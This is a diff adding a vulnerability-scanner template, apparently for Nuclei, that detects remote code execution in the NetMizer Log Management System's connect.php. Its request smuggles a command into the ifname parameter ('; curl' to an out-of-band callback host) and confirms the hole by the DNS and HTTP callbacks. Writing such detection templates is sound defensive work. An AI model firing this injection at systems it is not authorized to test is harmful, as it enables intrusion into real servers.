@@ -1,0 +1,28 @@
+id: netmizer-log-connect-rce
+info:
+  name: NetMizer Log Management System connect.php Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,dns,oast
+  description: |
+    A remote code execution vulnerability in NetMizer Log Management System's connect.php endpoint allows attackers to execute arbitrary commands.
+
+variables:
+  reverse: "{{interactsh-url}}"
+
+http:
+  - raw:
+      - |
+        GET /data/manage/connect.php?action=start&device=192.168.1.1&ifname=;curl+{{reverse}}+%23+&name=test&port=88 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
+      - type: word
+        part: interactsh_protocol
+        words:
+          - http
